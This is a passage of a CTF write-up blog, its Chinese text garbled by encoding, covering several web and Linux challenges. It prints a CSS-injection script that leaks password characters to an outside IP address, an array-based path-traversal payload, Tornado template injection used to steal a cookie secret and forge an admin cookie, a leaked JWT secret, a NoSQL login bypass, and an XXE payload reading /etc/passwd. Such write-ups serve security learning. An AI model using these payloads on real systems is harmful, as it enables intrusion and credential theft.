<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&quot;poc.css&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;#000000;&#125; input[type=password][value^=&quot;&#x27;&#x27;&#x27;</span> + i + <span class="string">&#x27;&#x27;&#x27;&quot;]&#123;background-image:url(&quot;http://47.97.199.89:8888/?flag=&#x27;&#x27;&#x27;</span> + i + <span class="string">&#x27;&#x27;&#x27;&quot;);&#125; &#x27;&#x27;&#x27;</span></span><br><span class="line">    f.write(payload + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>æ”¾åˆ°burp intrudeæ¨¡å—çˆ†ç ´</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200729165300.png" style="zoom: 67%;" />
<p>åœ¨VPSä¸Šç›‘å¬ç«¯å£</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200729165431.png" alt=""></p>
<p>é€æ¬¡çˆ†ç ´å„ä¸ªä½ç½®å¾—åˆ°flagã€‚</p>
<h3 id="File-Library">File Library</h3>
<p>é¢˜ç›®ç›´æ¥ç»™äº†æºä»£ç server.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = process.env.PORT || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Listening on port <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/getFile&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; file &#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        res.send(<span class="string">`file=<span class="subst">$&#123;file&#125;</span>\nFilename not specified!`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file.includes(<span class="string">&#x27; &#x27;</span>) || file.includes(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            res.send(<span class="string">`file=<span class="subst">$&#123;file&#125;</span>\nInvalid filename!`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!allowedFileType(file)) &#123;</span><br><span class="line">        res.send(<span class="string">`File type not allowed`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        file = file.slice(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> returnedFile = path.resolve(__dirname + <span class="string">&#x27;/&#x27;</span> + file);</span><br><span class="line"></span><br><span class="line">    fs.readFile(returnedFile, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">if</span> (err.code != <span class="string">&#x27;ENOENT&#x27;</span>) <span class="built_in">console</span>.log(err);</span><br><span class="line">            res.send(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.sendFile(returnedFile);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allowedFileType</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> format = file.slice(file.indexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format == <span class="string">&#x27;js&#x27;</span> || format == <span class="string">&#x27;ts&#x27;</span> || format == <span class="string">&#x27;c&#x27;</span> || format == <span class="string">&#x27;cpp&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¡µé¢å†…è¿˜ç»™äº†ä¸¤ä¸ªæç¤ºï¼š</p>
<p>ok.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Welcome to my sample javascript program!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Let&#x27;s checkout some funny issues in JS!</span></span><br><span class="line"></span><br><span class="line">[] == ![]; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> == []; <span class="comment">// -&gt; true</span></span><br><span class="line"><span class="literal">false</span> == ![]; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;b&quot;</span> + <span class="string">&quot;a&quot;</span> + +<span class="string">&quot;a&quot;</span> + <span class="string">&quot;a&quot;</span>); <span class="comment">// -&gt; baNaNa</span></span><br><span class="line"></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span>; <span class="comment">// -&gt; false</span></span><br><span class="line"></span><br><span class="line">(![] + [])[+[]] +</span><br><span class="line">  (![] + [])[+!+[]] +</span><br><span class="line">  ([![]] + [][[]])[+!+[] + [+[]]] +</span><br><span class="line">  (![] + [])[!+[] + !+[]];</span><br><span class="line"><span class="comment">// -&gt; &#x27;fail&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.all <span class="keyword">instanceof</span> <span class="built_in">Object</span>; <span class="comment">// -&gt; true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">document</span>.all; <span class="comment">// -&gt; &#x27;undefined&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MIN_VALUE &gt; <span class="number">0</span>; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] + [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]; <span class="comment">// -&gt; &#x27;1,2,34,5,6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;View more: https://github.com/denysdovhan/wtfjs&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>a.cpp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åº”è¯¥å°±æ˜¯å°è¯•åˆ©ç”¨server.jsè¯»å–flag.txtã€‚</p>
<p>å®¡è®¡æºä»£ç ï¼Œä¸»è¦æ˜¯ç”±ä¸¤ä¸ªå…³é”®çš„å¤„ç†ï¼š</p>
<p>æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯<code>js, ts, c, cpp</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!allowedFileType(file)) &#123;</span><br><span class="line">        res.send(<span class="string">`File type not allowed`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å–æ–‡ä»¶åçš„å‰äº”ä½</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        file = file.slice(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åç”¨<code>path.resolve</code>æ‹¼æ¥æˆæœ€ç»ˆè·¯å¾„ã€‚</p>
<p>payloadå°±ç›´æ¥ç»™å‡ºæ¥äº†ï¼Œåæ­£æˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚ã€‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getFile?file[]&#x3D;f&amp;file[]&#x3D;4&amp;file[]&#x3D;k&amp;file[]&#x3D;e&amp;file[]&#x3D;&#x2F;..&#x2F;flag.txt&amp;file[]&#x3D;.&amp;file[]&#x3D;js</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œnode.jsä¼šè§£ææˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file[] &#x3D; [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;&#x2F;..&#x2F;flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡åç¼€åå’Œæ–‡ä»¶é•¿åº¦çš„æ£€æŸ¥ã€‚</p>
<p>è¿™é‡Œè¿˜åˆ©ç”¨äº†<code>path.resolve</code>çš„ä¸€ä¸ªç‰¹æ€§</p>
<blockquote>
<p>The method creates absolute path from right to left until an absolute path is constructed</p>
<p>è¯¥æ–¹æ³•ä»å³åˆ°å·¦åˆ›å»ºç»å¯¹è·¯å¾„ï¼Œç›´åˆ°æ„é€ äº†ç»å¯¹è·¯å¾„ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯æ‰§è¡Œå®Œä¸‹é¢çš„è¯­å¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> returnedFile = path.resolve(__dirname + <span class="string">&#x27;/&#x27;</span> + [<span class="string">&quot;f&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;/../flag.txt&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>ç»“æœå°±æ˜¯<code>__dirname+'/'+'/../flag.txt'</code></p>
<h3 id="The-Usual-Suspects">The Usual Suspects</h3>
<p><strong>è€ƒå¯Ÿtornadoæ¨¡æ¿æ³¨å…¥+ç”Ÿæˆcookie secret</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211245.png" alt=""></p>
<p>å¾ˆæ˜æ˜¾å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œç”¨<code>&#123;&#123;7*'7'&#125;&#125;</code>éªŒè¯ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211407.png" alt=""></p>
<p>æŸ¥çœ‹å½“å‰ç½‘é¡µçš„cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;2|1:0|10:1595941408|5:admin|8:ZmFsc2U&#x3D;|bfe7af9eba0d5c6717c341e50fd8660db4e4fccbce187a20c1236205df3e3171&quot;</span><br></pre></td></tr></table></figure>
<p><code>ZmFsc2U=</code>æ˜¯<code>false</code>çš„base64ç¼–ç </p>
<p>é¢˜ç›®æç¤ºè¦æ‹¿secretï¼Œç”¨<code>&#123;&#123;config&#125;&#125;</code>ç›´æ¥æŠ¥é”™</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211530.png" alt=""></p>
<p>Googleä¸€ä¸‹tornado cookie secret</p>
<blockquote>
<p><a href="https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings">https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728212313.png" alt=""></p>
<p>ç”¨<code>global()</code>æŸ¥çœ‹å½“å‰å…¨å±€å˜é‡</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211912.png" alt=""></p>
<p>ç”¨<code>application.settings</code>è·å–cookie_secret</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728212416.png" alt=""></p>
<p>ç”¨è„šæœ¬ç”Ÿæˆtornado cookies</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> (</span><br><span class="line">	Dict,</span><br><span class="line">	Any,</span><br><span class="line">	Union,</span><br><span class="line">	Optional,</span><br><span class="line">	Awaitable,</span><br><span class="line">	Tuple,</span><br><span class="line">	List,</span><br><span class="line">	Callable,</span><br><span class="line">	Iterable,</span><br><span class="line">	Generator,</span><br><span class="line">	Type,</span><br><span class="line">	cast,</span><br><span class="line">	overload,</span><br><span class="line">)</span><br><span class="line">_UTF8_TYPES = (bytes, type(<span class="literal">None</span>))</span><br><span class="line">unicode_type = str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">utf8</span>(<span class="params">value: Union[None, str, bytes]</span>) -&gt; Optional[bytes]:</span>  <span class="comment"># noqa: F811</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Converts a string argument to a byte string.</span></span><br><span class="line"><span class="string">    If the argument is already a byte string or None, it is returned unchanged.</span></span><br><span class="line"><span class="string">    Otherwise it must be a unicode string and is encoded as utf8.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, _UTF8_TYPES):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, unicode_type):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;Expected bytes, unicode, or None; got %r&quot;</span> % type(value))</span><br><span class="line">    <span class="keyword">return</span> value.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create_signature_v2</span>(<span class="params">secret: Union[str, bytes], s: bytes</span>) -&gt; bytes:</span></span><br><span class="line">	hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)</span><br><span class="line">	hash.update(utf8(s))</span><br><span class="line">	<span class="keyword">return</span> utf8(hash.hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_field</span>(<span class="params">s: Union[str, bytes]</span>) -&gt; bytes:</span></span><br><span class="line">	<span class="keyword">return</span> utf8(<span class="string">&quot;%d:&quot;</span> % len(s)) + utf8(s)</span><br><span class="line"></span><br><span class="line">to_sign = <span class="string">b&quot;|&quot;</span>.join(</span><br><span class="line">			[</span><br><span class="line">				<span class="string">b&quot;2&quot;</span>,</span><br><span class="line">				format_field(<span class="string">&quot;0&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;1595249713&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;admin&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;dHJ1ZQ==&quot;</span>),</span><br><span class="line">				<span class="string">b&quot;&quot;</span>,</span><br><span class="line">			]</span><br><span class="line">		)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(to_sign + _create_signature_v2(<span class="string">&#x27;MangoDB\n&#x27;</span>,to_sign))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728213202.png" alt=""></p>
<p>ç”¨è¿™ä¸ªæ›´æ¢åŸå§‹çš„cookieï¼Œæ‹¿åˆ°flagã€‚</p>
<h3 id="CCC">CCC</h3>
<p><strong>è€ƒå¯Ÿæ–‡ä»¶åŒ…å«+JWT</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728170643.png" alt=""></p>
<p>åœ¨å³ä¾§èœå•æ ä¸­<code>Our Admins</code>å’Œ<code>Login</code>ä¸èƒ½ç›´æ¥ç‚¹å¼€ï¼Œä½†æ˜¯é€šè¿‡æºä»£ç å¯ä»¥çœ‹åˆ°é“¾æ¥äº†ä¸¤ä¸ªåœ°å€ï¼š<code>/adminNames</code>å’Œ<code>/login</code>ã€‚</p>
<p>è®¿é—®<code>/adminNames</code>ç›´æ¥ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªgithubä»“åº“åœ°å€ï¼š<a href="https://github.com/csivitu/authorized_users/blob/master">https://github.com/csivitu/authorized_users/blob/master</a></p>
<p>è®¿é—®<code>/login</code>æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéšä¾¿è¾“å…¥<code>admin:admin</code>ï¼Œè¿”å›åŒ…ä¸­æœ‰ä¸€ä¸ªJWT token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728171934.png" alt=""></p>
<p>æ‹¿åˆ°jwt.ioè§£ç ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;nqzva&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;nqzva&quot;,</span><br><span class="line">  &quot;admin&quot;: &quot;snyfr&quot;,</span><br><span class="line">  &quot;iat&quot;: 1595922746</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>nqzva</code>ç”¨ROT13è§£å¯†å¾—åˆ°<code>admin</code>ï¼Œ<code>snyfr</code>ç”¨ROT13è§£å¯†å¾—åˆ°<code>flase</code>ï¼Œå¹¶ä¸”ä¸ç®¡è¾“å…¥ä»€ä¹ˆç”¨æˆ·åå’Œå¯†ç ï¼Œéƒ½æ˜¯ç›¸åŒçš„tokenï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦æ‹¿åˆ°secretã€‚</p>
<p>å›å¤´å†æ¥çœ‹<code>/adminNames</code>ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728172911.png" alt=""></p>
<p>é‚£ä¹ˆä¹…å¯ä»¥è¯»å–node.jsçš„ç¯å¢ƒå˜é‡<code>../.env</code>ï¼Œæ‹¿åˆ°secret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JWT_SECRET&#x3D;Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆtoken</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728175724.png" alt=""></p>
<p>é€šè¿‡æ‰«æç›®å½•å¾—åˆ°<code>/admin</code>ï¼Œè®¿é—®è¿”å›ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;Invalid Token, Headers?&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡<code>Authorization</code>å­—æ®µå‘é€è¯·æ±‚åŒ…</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728175906.png" alt=""></p>
<p>ROT13è§£å¯†å¾—åˆ°flagã€‚</p>
<h2 id="Linux">Linux</h2>
<h3 id="AKA">AKA</h3>
<p>å¤§éƒ¨åˆ†çš„å‘½ä»¤éƒ½è®¾ç½®äº†aliasï¼Œä½†æ˜¯bashå‘½ä»¤æ²¡æœ‰ã€‚</p>
<h3 id="find32">find32</h3>
<p>æ„Ÿè§‰è¿™é¢˜è„‘æ´è¿˜æ˜¯æŒºå¤§çš„ã€‚ã€‚</p>
<p>SSHç™»å½•åæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œå†…å®¹ä¹Ÿæ˜¯éšæœºçš„å­—æ¯ï¼Œ32åœ¨ASCIIç ä¸­ä»£è¡¨ç©ºæ ¼å­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨CTFçš„flagä¸­å°±æ˜¯<code>_</code>æ¥ä»£æ›¿ã€‚</p>
<p>å†™ä¸€ä¸ªè„šæœ¬ä¼ åˆ°é¶æœºä¸Šå»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/user1/&quot;</span>  </span><br><span class="line">files = os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(path+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                print(<span class="string">&#x27;[+]&#x27;</span> + path + file)</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                        print(file)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            print(<span class="string">&#x27;[-]&#x27;</span> + file)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727225538.png" alt=""></p>
<p>æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œæç¤ºè¦ç”¨user2æ¥ç™»å½•</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727225647.png" alt=""></p>
<p>sshç™»å½•ä¹‹åï¼Œå½“å‰ç›®å½•ä¸‹æœ‰å‡ ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å¤§å°ç±»ä¼¼ï¼Œç”¨diffå‘½ä»¤ä¸€ä¸ªä¸ªæ¯”è¾ƒä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727230952.png" alt=""></p>
<h3 id="HTB-0x01">HTB 0x01</h3>
<p>nmapæ‰«æå‡º5001ç«¯å£è¿è¡ŒftpæœåŠ¡ï¼Œç›´æ¥anonymousç™»å½•æ‹¿flagã€‚</p>
<h3 id="HTB-0x02-0x05">HTB 0x02~0x05</h3>
<p>nmapæ‰«æç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp     open       ssh</span><br><span class="line">3000&#x2F;tcp   open       http</span><br></pre></td></tr></table></figure>
<p>å…ˆæ¥çœ‹çœ‹3000ç«¯å£ï¼Œè®¿é—®http://34.93.215.188:3000/ï¼Œæœ‰ä¸€ä¸ªç™»å½•æ¡†</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728103532.png" style="zoom: 67%;" />
<p>å…ˆç”¨<code>1 or 1=1</code> , <code>1' or 1=1 --</code>ï¼Œ<code>';-#$()</code>æ¥æµ‹è¯•æ˜¯ä¸æ˜¯SQLæ³¨å…¥ï¼Œç»“æœç›´æ¥è¿”å›<code>No user with username: ';-#$() and password: ';-#$()</code>ã€‚å†ç”¨burp fuzzä¸€ä¸‹å¸¸ç”¨çš„payloadå‘ç°æ˜¯NoSQLæ³¨å…¥ï¼Œç›´æ¥ç”¨ä¸‡èƒ½å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$ne]&#x3D;ca01h&amp;password[$ne]&#x3D;ca01h</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒå¦å¤–ä¸€ç¯‡åšæ–‡ï¼š<a href="https://ca0y1h.top/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/">NoSQLæ³¨å…¥ä¹‹MongoDB</a></p>
</blockquote>
<p>ç™»å½•æˆåŠŸåè·³è½¬åˆ°ä¸Šä¼ é¡µé¢</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104417.png" alt=""></p>
<p>ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œå†æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°HTB 0x02çš„flag</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104529.png" alt=""></p>
<p>çœ‹åˆ°å¯ä»¥ç”¨ä¸ç”¨çš„æ•°æ®æ ¼å¼æäº¤æŸ¥è¯¢ï¼Œæœ‰ä¸€ä¸ªæ˜¯XMLï¼Œç”¨ä¸‹é¢çš„payloadçœ‹çœ‹æ˜¯å¦å­˜åœ¨XXEæ³¨å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104913.png" alt=""></p>
<p>å‘ç°<code>/etc/passwd</code>æš—è—ä¸€ä¸ªgiståœ°å€ï¼š<a href="https://gist.github.com/sivel/c68f601137ef9063efd7">https://gist.github.com/sivel/c68f601137ef9063efd7</a></p>
<p>æ˜¯ä¸€ä¸ªç®¡ç†SSH Keyçš„å·¥å…·ï¼Œé‡Œé¢æåˆ°äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>/usr/local/bin/userkeys.sh</code>å’Œ<code>/etc/sshd/sshd_config</code>ã€‚åˆ†åˆ«ç”¨ä¸Šé¢çš„XXE payloadçœ‹ä¸€ä¸‹æ–‡ä»¶å†…å®¹</p>
<p><code>/etc/sshd/sshd_config</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This is the sshd server system-wide configuration file. See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># This sshd was compiled with PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented. Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">Include &#x2F;etc&#x2F;ssh&#x2F;sshd_config.d&#x2F;*.conf</span><br><span class="line"></span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># Expect 